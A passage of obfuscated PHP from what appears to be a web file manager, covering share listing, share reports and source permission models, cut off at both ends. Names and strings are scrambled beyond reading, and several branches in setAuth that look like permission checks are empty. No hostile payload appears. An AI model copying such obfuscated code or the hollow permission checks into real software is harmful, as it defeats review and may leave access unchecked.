$e…¬™î†Éİ[496] => array($e…¬™î†Éİ[389], "\x25{$BÎ¥ÎÈğÛ}\x25"), $e…¬™î†Éİ[432] => 0); $c×ÏÍİ¼İ = Model($e…¬™î†Éİ[806])->where($f™‚Êë‹ƒá)->field($e…¬™î†Éİ[1854])->find(); if (!$c×ÏÍİ¼İ) { return !1; } goto Dò¡ß´°; D’Ëì ìáÙ: } protected function remove($D¥œñ«ë¤‡) { goto D­™Š¢±½; A‰Èù˜¼Ğ›: $c‘ˆ…Ä§’ = $this->where($BòæÁìë )->delete(); if ($c‘ˆ…Ä§’) { Model($B¨¦¼Œ§ïÎ[573])->where(array($B¨¦¼Œ§ïÎ[477] => $D¥œñ«ë¤‡))->delete(); } $cÕ†£œê¬Á = is_array($D¥œñ«ë¤‡) ? $D¥œñ«ë¤‡[1] : array($D¥œñ«ë¤‡); goto Aª­Š›†˜ä; D­™Š¢±½: $B¨¦¼Œ§ïÎ =& $_SERVER[úÉ·öƒÑì©]; if (is_array($D¥œñ«ë¤‡)) { $D¥œñ«ë¤‡ = array($B¨¦¼Œ§ïÎ[7], $D¥œñ«ë¤‡); } $BòæÁìë  = array($B¨¦¼Œ§ïÎ[477] => $D¥œñ«ë¤‡); goto A‰Èù˜¼Ğ›; Aª­Š›†˜ä: for ($E÷°”Ş•à = 0; $E÷°”Ş•à < count($cÕ†£œê¬Á); $E÷°”Ş•à++) { $aä¾–¶ÖåÓ = $this->getInfo($cÕ†£œê¬Á[$E÷°”Ş•à]); if ($aä¾–¶ÖåÓ[$B¨¦¼Œ§ïÎ[484]] == $B¨¦¼Œ§ïÎ[87]) { Model($B¨¦¼Œ§ïÎ[542])->eventShare($aä¾–¶ÖåÓ[$B¨¦¼Œ§ïÎ[404]], $B¨¦¼Œ§ïÎ[1843]); } if ($aä¾–¶ÖåÓ[$B¨¦¼Œ§ïÎ[482]] == $B¨¦¼Œ§ïÎ[87]) { Model($B¨¦¼Œ§ïÎ[542])->eventShare($aä¾–¶ÖåÓ[$B¨¦¼Œ§ïÎ[404]], $B¨¦¼Œ§ïÎ[1842]); } } return $c‘ˆ…Ä§’; goto bŸõİæµ ¸; bŸõİæµ ¸: } protected function removeBySource($C‰ğÀ°´ÇÅ) { goto BòäôÚÖÙÁ; fœ¤›Ì™º¹: $Få‡‰ÁôÏ = array_to_keyvalue($Få‡‰ÁôÏ, $däÚù·à¨[33], $däÚù·à¨[477]); if (!$Få‡‰ÁôÏ) { return; } $a¦ßÆŒ—‘İ = array($däÚù·à¨[476] => array($däÚù·à¨[420], $Få‡‰ÁôÏ)); goto c•™¡¬Äß¡; c•™¡¬Äß¡: $this->where($a¦ßÆŒ—‘İ)->delete(); Model($däÚù·à¨[573])->where($a¦ßÆŒ—‘İ)->delete(); goto eŞ‹–¤ê‡; BòäôÚÖÙÁ: $däÚù·à¨ =& $_SERVER[úÉ·öƒÑì©]; $a¦ßÆŒ—‘İ = array($däÚù·à¨[419] => array($däÚù·à¨[420], $C‰ğÀ°´ÇÅ)); $Få‡‰ÁôÏ = $this->field($däÚù·à¨[477])->where($a¦ßÆŒ—‘İ)->select(); goto fœ¤›Ì™º¹; eŞ‹–¤ê‡: } public function listAll($D¹É½ŠâØÕ) { goto eïò‡îÜöŠ; EÉñª®İ‰: return $b¼÷·“Áñš; goto f”ñÆ¶£ˆÑ; F¥É½ğß¨›: $b¼÷·“Áñš = $this->_makeOrder()->where($eè›ƒÄêà™)->selectPage(20); if (empty($b¼÷·“Áñš[$CáÖÌ“°¿ê[376]])) { return array(); } $this->_listDataApply($b¼÷·“Áñš[$CáÖÌ“°¿ê[376]]); goto EÉñª®İ‰; C¨¹¸‘ñ®: if ($D¹É½ŠâØÕ[$CáÖÌ“°¿ê[737]]) { $bÚÂÀøŠ± = $D¹É½ŠâØÕ[$CáÖÌ“°¿ê[485]] ? $D¹É½ŠâØÕ[$CáÖÌ“°¿ê[485]] : strtotime(date($CáÖÌ“°¿ê[1855])); $eè›ƒÄêà™[$CáÖÌ“°¿ê[194]] = array($CáÖÌ“°¿ê[340], array($D¹É½ŠâØÕ[$CáÖÌ“°¿ê[737]], $bÚÂÀøŠ±)); } if ($D¹É½ŠâØÕ[$CáÖÌ“°¿ê[29]]) { $eè›ƒÄêà™[$D¹É½ŠâØÕ[$CáÖÌ“°¿ê[29]]] = 1; } else { $eè›ƒÄêà™[] = array($CáÖÌ“°¿ê[482] => array($CáÖÌ“°¿ê[977], 0), $CáÖÌ“°¿ê[484] => array($CáÖÌ“°¿ê[977], 0), $CáÖÌ“°¿ê[1832] => $CáÖÌ“°¿ê[1786]); } if ($D¹É½ŠâØÕ[$CáÖÌ“°¿ê[1782]]) { $eè›ƒÄêà™[] = array($CáÖÌ“°¿ê[479] => $D¹É½ŠâØÕ[$CáÖÌ“°¿ê[1782]], $CáÖÌ“°¿ê[1441] => array($CáÖÌ“°¿ê[389], "\x25{$D¹É½ŠâØÕ[$CáÖÌ“°¿ê[1782]]}\45"), $CáÖÌ“°¿ê[1832] => $CáÖÌ“°¿ê[1786]); } goto F¥É½ğß¨›; eïò‡îÜöŠ: $CáÖÌ“°¿ê =& $_SERVER[úÉ·öƒÑì©]; $eè›ƒÄêà™ = array(); if ($D¹É½ŠâØÕ[$CáÖÌ“°¿ê[1535]]) { $eè›ƒÄêà™[$CáÖÌ“°¿ê[1535]] = $D¹É½ŠâØÕ[$CáÖÌ“°¿ê[1535]]; } goto C¨¹¸‘ñ®; f”ñÆ¶£ˆÑ: } public function listDataApply($AÂ©…£¹¦°) { $this->_listDataApply($AÂ©…£¹¦°); return $AÂ©…£¹¦°; } private function _listDataApply(&$b£ï°¡á”í) { goto CÂ‚×Ü‚½; b›„¾¨‹à¯: $FĞ¼ºó•Šå = array_to_keyvalue($b£ï°¡á”í, $F¶¬®á×ŸŸ[33], $F¶¬®á×ŸŸ[404]); $bóÔ‡®éÍ = Model($F¶¬®á×ŸŸ[806])->sourceListInfo($FĞ¼ºó•Šå, !0); foreach ($b£ï°¡á”í as $FğÓÀÅö² => &$C’¾øË¦Å—) { $fá¼Ûºİí‡ = $C’¾øË¦Å—[$F¶¬®á×ŸŸ[1535]]; $C’¾øË¦Å—[$F¶¬®á×ŸŸ[1856]] = $E¹–ëëÒÏ[$fá¼Ûºİí‡] ? $E¹–ëëÒÏ[$fá¼Ûºİí‡] : !1; $FÃÈİ¿–òè = $C’¾øË¦Å—[$F¶¬®á×ŸŸ[404]]; $C’¾øË¦Å—[$F¶¬®á×ŸŸ[85]] = $bóÔ‡®éÍ[$FÃÈİ¿–òè] ? $bóÔ‡®éÍ[$FÃÈİ¿–òè] : !1; if ($C’¾øË¦Å—[$F¶¬®á×ŸŸ[85]][$F¶¬®á×ŸŸ[432]] == $F¶¬®á×ŸŸ[87]) { unset($b£ï°¡á”í[$FğÓÀÅö²]); } if ($C’¾øË¦Å—[$F¶¬®á×ŸŸ[85]] != $F¶¬®á×ŸŸ[191] && !$C’¾øË¦Å—[$F¶¬®á×ŸŸ[85]]) { unset($b£ï°¡á”í[$FğÓÀÅö²]); } } goto CºƒÎİ™Ì; CÂ‚×Ü‚½: $F¶¬®á×ŸŸ =& $_SERVER[úÉ·öƒÑì©]; $BØÁŸç¨ïŠ = array_to_keyvalue($b£ï°¡á”í, $F¶¬®á×ŸŸ[33], $F¶¬®á×ŸŸ[1535]); $E¹–ëëÒÏ = Model($F¶¬®á×ŸŸ[515])->userListInfo(array_unique($BØÁŸç¨ïŠ)); goto b›„¾¨‹à¯; CºƒÎİ™Ì: unset($C’¾øË¦Å—); $b£ï°¡á”í = array_values($b£ï°¡á”í); goto eŸå­¼½š±; eŸå­¼½š±: } private function _makeOrder($C£Ëó½ßÀ = '') { goto BŒ–ˆßäÎö; C˜öëğ¢•î: $C£Ëó½ßÀ = $C£Ëó½ßÀ . "{$fâ£·ÎÖ¹ä}\40{$A ¢ÊáŒ‚Â}"; return $this->order($C£Ëó½ßÀ); goto D”«ìÊÌŒ¾; e÷øâËºà­: $fâ£·ÎÖ¹ä = Input::get($BÈ‚áêñ˜[444], $BÈ‚áêñ˜[7], $BÈ‚áêñ˜[425], $FÉ¢ó‘Â™÷); $A ¢ÊáŒ‚Â = Input::get($BÈ‚áêñ˜[445], $BÈ‚áêñ˜[7], $BÈ‚áêñ˜[1857], array($BÈ‚áêñ˜[1781], $BÈ‚áêñ˜[439])); $A ¢ÊáŒ‚Â = $A¸´†ÍñÙÓ[$A ¢ÊáŒ‚Â]; goto C˜öëğ¢•î; BŒ–ˆßäÎö: $BÈ‚áêñ˜ =& $_SERVER[úÉ·öƒÑì©]; $FÉ¢ó‘Â™÷ = array($BÈ‚áêñ˜[194], $BÈ‚áêñ˜[485], $BÈ‚áêñ˜[1845], $BÈ‚áêñ˜[1846]); $A¸´†ÍñÙÓ = array($BÈ‚áêñ˜[437] => $BÈ‚áêñ˜[438], $BÈ‚áêñ˜[439] => $BÈ‚áêñ˜[440]); goto e÷øâËºà­; D”«ìÊÌŒ¾: } public function reportAdd($FÇğÆå¢–) { $BÍ¥Ş®¤æ =& $_SERVER[úÉ·öƒÑì©]; $Bä©—šíì‡ = array($BÍ¥Ş®¤æ[477] => $FÇğÆå¢–[$BÍ¥Ş®¤æ[477]], $BÍ¥Ş®¤æ[1535] => USER_ID); if (Model($BÍ¥Ş®¤æ[1853])->where($Bä©—šíì‡)->find()) { return !1; } $dîÉÙàšÙ = array($BÍ¥Ş®¤æ[477] => $FÇğÆå¢–[$BÍ¥Ş®¤æ[477]], $BÍ¥Ş®¤æ[1441] => $FÇğÆå¢–[$BÍ¥Ş®¤æ[1441]], $BÍ¥Ş®¤æ[404] => $FÇğÆå¢–[$BÍ¥Ş®¤æ[404]], $BÍ¥Ş®¤æ[456] => $FÇğÆå¢–[$BÍ¥Ş®¤æ[456]], $BÍ¥Ş®¤æ[1535] => USER_ID, $BÍ¥Ş®¤æ[29] => $FÇğÆå¢–[$BÍ¥Ş®¤æ[29]], $BÍ¥Ş®¤æ[440] => $FÇğÆå¢–[$BÍ¥Ş®¤æ[440]]); return Model($BÍ¥Ş®¤æ[1853])->add($dîÉÙàšÙ); } public function reportList($FÇŞ¬…£ÄŸ) { goto a­ë÷ÄÅê¬; FÂˆÜß¨¾: $this->_listDataApply($f¢šÕæ¢ßÅ[$dÆ¯Ê„ŞÒ[376]]); return $f¢šÕæ¢ßÅ; goto cõø­ç‡Ó¼; e¨µÛâÏ±§: if (empty($f¢šÕæ¢ßÅ[$dÆ¯Ê„ŞÒ[376]])) { return array(); } $aŠµ¬Æ… = array_to_keyvalue_group($f¢šÕæ¢ßÅ[$dÆ¯Ê„ŞÒ[376]], $dÆ¯Ê„ŞÒ[726], $dÆ¯Ê„ŞÒ[477]); if (!empty($aŠµ¬Æ…[0])) { $FÇŞ¬…£ÄŸ = $aŠµ¬Æ…[0]; $FÑãË¬õÖÒ = array($dÆ¯Ê„ŞÒ[477] => array($dÆ¯Ê„ŞÒ[7], $FÇŞ¬…£ÄŸ)); $bƒßÇ¦½—² = $this->where($FÑãË¬õÖÒ)->field($dÆ¯Ê„ŞÒ[477])->select(); $bƒßÇ¦½—² = array_to_keyvalue($bƒßÇ¦½—², $dÆ¯Ê„ŞÒ[33], $dÆ¯Ê„ŞÒ[477]); $CÇ˜¤ä°š™ = array_diff($FÇŞ¬…£ÄŸ, $bƒßÇ¦½—²); if (!empty($CÇ˜¤ä°š™)) { foreach ($f¢šÕæ¢ßÅ[$dÆ¯Ê„ŞÒ[376]] as $F—Òïò¢Óè => $dé¤Ô¨ºå) { if (in_array($dé¤Ô¨ºå[$dÆ¯Ê„ŞÒ[477]], $CÇ˜¤ä°š™)) { unset($f¢šÕæ¢ßÅ[$dÆ¯Ê„ŞÒ[376]][$F—Òïò¢Óè]); } } } } goto FÂˆÜß¨¾; a­ë÷ÄÅê¬: $dÆ¯Ê„ŞÒ =& $_SERVER[úÉ·öƒÑì©]; $FÑãË¬õÖÒ = array(); if ($FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[737]]) { $cãôÏ½æ = $FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[485]] ? $FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[485]] : strtotime(date($dÆ¯Ê„ŞÒ[1855])); $FÑãË¬õÖÒ[$dÆ¯Ê„ŞÒ[194]] = array($dÆ¯Ê„ŞÒ[340], array($FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[737]], $cãôÏ½æ)); } goto aÎğ¤¥¢„ğ; b³“ï·£í¡: $a´ËÑÖ‹Åˆ = array($dÆ¯Ê„ŞÒ[437] => $dÆ¯Ê„ŞÒ[438], $dÆ¯Ê„ŞÒ[439] => $dÆ¯Ê„ŞÒ[440]); $CŒ²ßĞÔ¶ò = $dÆ¯Ê„ŞÒ[1862] . $a´ËÑÖ‹Åˆ[$CïÃÃ¾ç¸–]; $f¢šÕæ¢ßÅ = Model($dÆ¯Ê„ŞÒ[1853])->where($FÑãË¬õÖÒ)->order($CŒ²ßĞÔ¶ò)->selectPage(20); goto e¨µÛâÏ±§; aÎğ¤¥¢„ğ: if (isset($FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[29]]) && in_array($FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[29]], array($dÆ¯Ê„ŞÒ[87], $dÆ¯Ê„ŞÒ[1858], $dÆ¯Ê„ŞÒ[1859], $dÆ¯Ê„ŞÒ[1860], $dÆ¯Ê„ŞÒ[1861]))) { $FÑãË¬õÖÒ[$dÆ¯Ê„ŞÒ[29]] = $FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[29]]; } if (isset($FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[726]]) && in_array($FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[726]], array($dÆ¯Ê„ŞÒ[191], $dÆ¯Ê„ŞÒ[87], $dÆ¯Ê„ŞÒ[1858], $dÆ¯Ê„ŞÒ[1859]))) { $FÑãË¬õÖÒ[$dÆ¯Ê„ŞÒ[726]] = $FÇŞ¬…£ÄŸ[$dÆ¯Ê„ŞÒ[726]]; } $CïÃÃ¾ç¸– = Input::get($dÆ¯Ê„ŞÒ[445], $dÆ¯Ê„ŞÒ[7], $dÆ¯Ê„ŞÒ[1857], array($dÆ¯Ê„ŞÒ[1781], $dÆ¯Ê„ŞÒ[439])); goto b³“ï·£í¡; cõø­ç‡Ó¼: } public function reportStatus($eöãºº¯™ì) { goto C¢ÃŞ†ÑŠ; dÆá–‚ŸŸÉ: if (!$D¥»¬ĞÕ“æ) { return !1; } $AÖøé¦„âÛ = array($Aé‰ÈáÆ½[726] => $eöãºº¯™ì[$Aé‰ÈáÆ½[726]]); if ($eöãºº¯™ì[$Aé‰ÈáÆ½[726]] == $Aé‰ÈáÆ½[1859] && $D¥»¬ĞÕ“æ[$Aé‰ÈáÆ½[726]] == $Aé‰ÈáÆ½[1859]) { $AÖøé¦„âÛ[$Aé‰ÈáÆ½[726]] = 0; } goto b¿‰Ú¾Õé; b¿‰Ú¾Õé: $cì¢ŠÖÕë± = Model($Aé‰ÈáÆ½[1853])->where($a¬Ôæ×õÊÄ)->save($AÖøé¦„âÛ); if ($eöãºº¯™ì[$Aé‰ÈáÆ½[726]] == $Aé‰ÈáÆ½[1858]) { if ($D¥»¬ĞÕ“æ[$Aé‰ÈáÆ½[456]] != $Aé‰ÈáÆ½[191] && $this->shareFileMeta($D¥»¬ĞÕ“æ[$Aé‰ÈáÆ½[456]])) { $this->shareFileMeta($D¥»¬ĞÕ“æ[$Aé‰ÈáÆ½[456]], 0); } $this->remove($D¥»¬ĞÕ“æ[$Aé‰ÈáÆ½[477]]); return !0; } if ($cì¢ŠÖÕë± && $eöãºº¯™ì[$Aé‰ÈáÆ½[726]] == $Aé‰ÈáÆ½[1859]) { $DéĞù„ÑÑÏ = $AÖøé¦„âÛ[$Aé‰ÈáÆ½[726]] == $Aé‰ÈáÆ½[1859] ? 1 : 0; $this->shareFileMeta($D¥»¬ĞÕ“æ[$Aé‰ÈáÆ½[456]], $DéĞù„ÑÑÏ); $this->removeByFile($D¥»¬ĞÕ“æ[$Aé‰ÈáÆ½[456]]); } goto d§ë†ìä; d§ë†ìä: return $cì¢ŠÖÕë±; goto E¡…ªä›Ïô; C¢ÃŞ†ÑŠ: $Aé‰ÈáÆ½ =& $_SERVER[úÉ·öƒÑì©]; $a¬Ôæ×õÊÄ = array($Aé‰ÈáÆ½[402] => $eöãºº¯™ì[$Aé‰ÈáÆ½[402]]); $D¥»¬ĞÕ“æ = Model($Aé‰ÈáÆ½[1853])->where($a¬Ôæ×õÊÄ)->field($Aé‰ÈáÆ½[1863])->find(); goto dÆá–‚ŸŸÉ; E¡…ªä›Ïô: } private function removeByFile($D“º‹†ˆğ²) { goto eîê¢£¨Ó‘; E‰Éù¼”‡: $FÑ¸ô‹¹ËÁ = array_to_keyvalue($dºù™À°, $fÖ‘×½±Ó§[33], $fÖ‘×½±Ó§[477]); $this->remove($FÑ¸ô‹¹ËÁ); goto DÙ±¡Ú¡°…; eîê¢£¨Ó‘: $fÖ‘×½±Ó§ =& $_SERVER[úÉ·öƒÑì©]; $dºù™À° = Model($fÖ‘×½±Ó§[806])->where(array($fÖ‘×½±Ó§[456] => $D“º‹†ˆğ²))->field($fÖ‘×½±Ó§[404])->select(); $eÖŞÒÖß™ß = array_to_keyvalue($dºù™À°, $fÖ‘×½±Ó§[33], $fÖ‘×½±Ó§[404]); goto B¨°–¼‹„¹; B¨°–¼‹„¹: $C”’« Äº = array($fÖ‘×½±Ó§[404] => array($fÖ‘×½±Ó§[7], $eÖŞÒÖß™ß), $fÖ‘×½±Ó§[482] => 1); $dºù™À° = $this->where($C”’« Äº)->field($fÖ‘×½±Ó§[477])->select(); if (empty($dºù™À°)) { return; } goto E‰Éù¼”‡; DÙ±¡Ú¡°…: } private function shareFileMeta($FÎ‹²Š–’á, $AÆ‚²¶Ø = null) { $e¯Ù˜Öš†Ñ =& $_SERVER[úÉ·öƒÑì©]; $dâšÀå…¸ = array($e¯Ù˜Öš†Ñ[456] => $FÎ‹²Š–’á, $e¯Ù˜Öš†Ñ[93] => $e¯Ù˜Öš†Ñ[1864]); if (is_null($AÆ‚²¶Ø)) { return Model($e¯Ù˜Öš†Ñ[1865])->where($dâšÀå…¸)->find(); } $dâšÀå…¸[$e¯Ù˜Öš†Ñ[381]] = $AÆ‚²¶Ø; Model($e¯Ù˜Öš†Ñ[1865])->add($dâšÀå…¸, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\143\145\137\x61\165\x74\150"; public function getAuth($cÅ´‘’Šì®) { goto f†Üø¸Ç˜ã; FŒ¸œã¼‡: array_multisort($aÌ¦Ÿ¹÷·º, SORT_DESC, $f–òŠÛ’Ã); return $f–òŠÛ’Ã; goto bÅèÜ“Ç–¼; f†Üø¸Ç˜ã: $Cçğº‘ğ· =& $_SERVER[úÉ·öƒÑì©]; $B‘³îĞÕ‚¢ = $this->sourceAuthSelect($cÅ´‘’Šì®); $f–òŠÛ’Ã = array(); goto e†ÑƒÆÍ“º; e†ÑƒÆÍ“º: $aÌ¦Ÿ¹÷·º = array(); $FË¶Å§ŸÑ³ = 2 << 25; foreach ($B‘³îĞÕ‚¢ as $c×ø‡´š·”) { goto bÎÔ‡Õ¸ôç; Cø¤ï»é‚à: $f‹§š¸ßŠß = 0; if ($c×ø‡´š·”[$Cçğº‘ğ·[413]] == SourceModel::TYPE_GROUP) { $f‹§š¸ßŠß = $FË¶Å§ŸÑ³ * 2; } if ($c×ø‡´š·”[$Cçğº‘ğ·[413]] == SourceModel::TYPE_USER) { $f‹§š¸ßŠß = $FË¶Å§ŸÑ³; } goto FÎÅÀÉİ¢µ; bÎÔ‡Õ¸ôç: $cŒ§–„·Û = Model($Cçğº‘ğ·[1866])->listData($c×ø‡´š·”[$Cçğº‘ğ·[1794]]); if (!$cŒ§–„·Û) { continue; } $f–òŠÛ’Ã[] = $c×ø‡´š·”; goto Cø¤ï»é‚à; FÎÅÀÉİ¢µ: if ($c×ø‡´š·”[$Cçğº‘ğ·[413]] == SourceModel::TYPE_USER && $c×ø‡´š·”[$Cçğº‘ğ·[493]] == $Cçğº‘ğ·[191]) { $f‹§š¸ßŠß = 0; } $aÌ¦Ÿ¹÷·º[] = $cŒ§–„·Û[$Cçğº‘ğ·[415]] + $f‹§š¸ßŠß; goto E«óá”šÏù; E«óá”šÏù: } goto FŒ¸œã¼‡; bÅèÜ“Ç–¼: } public function sourceAuthSelect($AŞÍã‚áÂ) { goto d¾¡™Ã˜Ÿ; f¦ªÉ—›ÑĞ: $dºÚË‘¢ö = $this->field($f×Ğä‰ç×Œ)->order($B½ôï‘Ò±ë[402])->where($DİÕŒà†ôõ)->select(); $fá¦ÉÓÚğ± = array_to_keyvalue_group($dºÚË‘¢ö, $B½ôï‘Ò±ë[404]); foreach ($AŞÍã‚áÂ as $Aº¤´•±Ôö) { $aÏÅİ²™ë[$Aº¤´•±Ôö] = $fá¦ÉÓÚğ±[$Aº¤´•±Ôö] ? $fá¦ÉÓÚğ±[$Aº¤´•±Ôö] : array(); } goto EÍ¸„½êáó; d¾¡™Ã˜Ÿ: $B½ôï‘Ò±ë =& $_SERVER[úÉ·öƒÑì©]; static $aÏÅİ²™ë = array(); $aÄ¼Ù«¨òß = is_array($AŞÍã‚áÂ) ? !1 : !0; goto A©À°¢ëÇ˜; EÍ¸„½êáó: if ($aÄ¼Ù«¨òß) { return $dºÚË‘¢ö; } return $fá¦ÉÓÚğ±; goto f‘—ª„â¡ê; A©À°¢ëÇ˜: if ($aÄ¼Ù«¨òß) { $AŞÍã‚áÂ = array($AŞÍã‚áÂ); } $Bˆò…§‘¯Ğ = array(); foreach ($AŞÍã‚áÂ as $Aº¤´•±Ôö) { if (isset($aÏÅİ²™ë[$Aº¤´•±Ôö])) { $Bˆò…§‘¯Ğ[$Aº¤´•±Ôö] = $aÏÅİ²™ë[$Aº¤´•±Ôö]; } } goto DàË«šõ‘; DàË«šõ‘: if (count($Bˆò…§‘¯Ğ) == count($AŞÍã‚áÂ)) { return $aÄ¼Ù«¨òß ? $Bˆò…§‘¯Ğ[$AŞÍã‚áÂ[0]] : $Bˆò…§‘¯Ğ; } $f×Ğä‰ç×Œ = $B½ôï‘Ò±ë[1867]; $DİÕŒà†ôõ = array($B½ôï‘Ò±ë[404] => array($B½ôï‘Ò±ë[7], $AŞÍã‚áÂ)); goto f¦ªÉ—›ÑĞ; f‘—ª„â¡ê: } public function setAuth($CÉô¼Æè­, $BÜšÃ‡Ÿ­Ò) { goto eË±¡Ê¸À¬; EŞÉ¥ŠÒÍ˜: return !0; goto bÕÅ‘Œôå; aÚÅîËÙ…Š: foreach ($BÜšÃ‡Ÿ­Ò as $AÂÎñÀÉ) { if (!in_array($AÂÎñÀÉ[$d„‚œ¢³–Õ[413]], $e¡ŞÂ¾¯Œ)) { show_json(LNG($d„‚œ¢³–Õ[1868]), !1); } if ($D¥®æÁ«ê != $BìÙŞ×¸öâ) { if ($AÂÎñÀÉ[$d„‚œ¢³–Õ[413]] == SourceModel::TYPE_GROUP) { } if ($AÂÎñÀÉ[$d„‚œ¢³–Õ[493]] != 0 && !in_array($AÂÎñÀÉ[$d„‚œ¢³–Õ[493]], $Dãá‡Ã©÷”)) { } } if ($AÂÎñÀÉ[$d„‚œ¢³–Õ[493]] == 0) { $AÂÎñÀÉ[$d„‚œ¢³–Õ[413]] = SourceModel::TYPE_USER; } $AîÎ®äšá„[] = array($d„‚œ¢³–Õ[404] => $CÉô¼Æè­, $d„‚œ¢³–Õ[413] => intval($AÂÎñÀÉ[$d„‚œ¢³–Õ[413]]), $d„‚œ¢³–Õ[493] => intval($AÂÎñÀÉ[$d„‚œ¢³–Õ[493]]), $d„‚œ¢³–Õ[1794] => intval($AÂÎñÀÉ[$d„‚œ¢³–Õ[1794]]) ? intval($AÂÎñÀÉ[$d„‚œ¢³–Õ[1794]]) : 0, $d„‚œ¢³–Õ[1848] => intval($AÂÎñÀÉ[$d„‚œ¢³–Õ[1848]]) ? intval($AÂÎñÀÉ[$d„‚œ¢³–Õ[1848]]) : -1); } $this->where(array($d„‚œ¢³–Õ[419] => $CÉô¼Æè­))->delete(); $this->addAll($AîÎ®äšá„); goto EŞÉ¥ŠÒÍ˜; eË±¡Ê¸À¬: $d„‚œ¢³–Õ =& $_SERVER[úÉ·öƒÑì©]; $EáºËĞÑİ” = Model($d„‚œ¢³–Õ[1213])->sourceInfo($CÉô¼Æè­); if (!$EáºËĞÑİ”) { return !1; } goto fÑã°ÎÂá†; bÃÁ“…¼õ†: if ($D¥®æÁ«ê != $BìÙŞ×¸öâ) { $dÏãŞ°˜Æ¾ = array($d„‚œ¢³–Õ[1699] => $D¥®æÁ«ê); $Dãá‡Ã©÷” = Model($d„‚œ¢³–Õ[1780])->field($d„‚œ¢³–Õ[1535])->where($dÏãŞ°˜Æ¾)->select(); $Dãá‡Ã©÷” = array_to_keyvalue($Dãá‡Ã©÷”, $d„‚œ¢³–Õ[33], $d„‚œ¢³–Õ[1535]); } $e¡ŞÂ¾¯Œ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $AîÎ®äšá„ = array(); goto aÚÅîËÙ…Š; fÑã°ÎÂá†: if ($EáºËĞÑİ”[$d„‚œ¢³–Õ[413]] != SourceModel::TYPE_GROUP) { return !1; } $BìÙŞ×¸öâ = 1; $D¥®æÁ«ê = $EáºËĞÑİ”[$d„‚œ¢³–Õ[493]]; goto bÃÁ“…¼õ†; bÕÅ‘Œôå: } public function authClear($BÛæ¨Äæñö) { $AĞë†¨Êï =& $_SERVER[úÉ·öƒÑì©]; $BÌÍİ³Ñà = Model($AĞë†¨Êï[1213])->sourceInfo($BÛæ¨Äæñö); $Dó†Á¯¹¬ó = array($BÛæ¨Äæñö); if ($BÌÍİ³Ñà[$AĞë†¨Êï[412]] == $AĞë†¨Êï[87]) { $Cò¥·ÛØéó = array($AĞë†¨Êï[562] => array($AĞë†¨Êï[521], $BÌÍİ³Ñà[$AĞë†¨Êï[496]] . $BÛæ¨Äæñö . $AĞë†¨Êï[522])); $Dó†Á¯¹¬ó = Model($AĞë†¨Êï[1213])->field($AĞë†¨Êï[419])->where($Cò¥·ÛØéó)->getField($AĞë†¨Êï[404], !0); $Dó†Á¯¹¬ó[] = $BÛæ¨Äæñö; } $this->where(array($AĞë†¨Êï[419] => array($AĞë†¨Êï[420], $Dó†Á¯¹¬ó)))->delete(); return !0; } public function getAllChildren($E…à÷®½¿›) { goto e ğÈÇ­‚; e ğÈÇ­‚: $b–¬»¦³¯” =& $_SERVER[úÉ·öƒÑì©]; $a½ù²±Œ = Model($b–¬»¦³¯”[1213])->sourceInfo($E…à÷®½¿›); if ($a½ù²±Œ[$b–¬»¦³¯”[412]] != $b–¬»¦³¯”[87]) { return $this->sourceListAuth(array($E…à÷®½¿›)); } goto FçÍìà„–­; fÖÅš¥Ö: if ($a½ù²±Œ[$b–¬»¦³¯”[487]] == $b–¬»¦³¯”[191] && $a½ù²±Œ[$b–¬»¦³¯”[493]] != $a‘™Œ¸íƒ) { $bÀì‘Æé” = $this->groupChidldAllRootSource($a½ù²±Œ[$b–¬»¦³¯”[493]]); } $dî¬……¾ˆ = $this->field($b–¬»¦³¯”[404])->group($b–¬»¦³¯”[404])->select(); $dî¬……¾ˆ = array_to_keyvalue($dî¬……¾ˆ, $b–¬»¦³¯”[33], $b–¬»¦³¯”[404]); goto E«Ğ›¨ªº¾; E«Ğ›¨ªº¾: if (!$dî¬……¾ˆ) { return array(); } $E Éºáé¯ = $b–¬»¦³¯”[1869]; $B©à›´´˜‹ = array($b–¬»¦³¯”[404] => array($b–¬»¦³¯”[7], $dî¬……¾ˆ), $b–¬»¦³¯”[432] => $b–¬»¦³¯”[191]); goto BôÄÖã ÖÒ; a¬…È©¿–Ú: return $this->sourceListAuth($fò—×¡¶İ); goto f‘·ë¹Ÿª›; BôÄÖã ÖÒ: $aÌîøù‘£– = Model($b–¬»¦³¯”[806])->field($E Éºáé¯)->where($B©à›´´˜‹)->select(); $fò—×¡¶İ = array($E…à÷®½¿›); foreach ($aÌîøù‘£– as $d°¿“³ÅÙÙ) { foreach ($bÀì‘Æé” as $F‹˜Á»á‰…) { $bğÆ¼ğá¯æ = $b–¬»¦³¯”[47] . $F‹˜Á»á‰… . $b–¬»¦³¯”[47]; $aö®ˆ§õá = $d°¿“³ÅÙÙ[$b–¬»¦³¯”[496]] . $d°¿“³ÅÙÙ[$b–¬»¦³¯”[404]] . $b–¬»¦³¯”[47]; if (strstr($aö®ˆ§õá, $bğÆ¼ğá¯æ)) { $fò—×¡¶İ[] = $d°¿“³ÅÙÙ[$b–¬»¦³¯”[404]]; break; } } } goto a¬…È©¿–Ú; FçÍìà„–­: if ($a½ù²±Œ[$b–¬»¦³¯”[413]] != SourceModel::TYPE_GROUP) { return array(); } $a‘™Œ¸íƒ = 1; $bÀì‘Æé” = array($E…à÷®½¿›); goto fÖÅš¥Ö; f‘·ë¹Ÿª›: } private function sourceListAuth($Eˆ…Ï¦Âøà) { goto E®çä¦ÙİÅ; f‰ê©¡õß: array_multisort($CøíëØÛİù, SORT_ASC, $cÜ°ë¨ÌˆÒ); return $cÜ°ë¨ÌˆÒ; goto C‰–áåÈ…Ø; D¼£ñâ¹İ¦: $cÜ°ë¨ÌˆÒ = array(); $CøíëØÛİù = array(); foreach ($EŞ‡œªïäÂ as $f†¦Í°ºÜ) { goto DùÄ»ƒÜÏô; E¨Å•í–‡: $BÍ÷¨ô¿éâ = 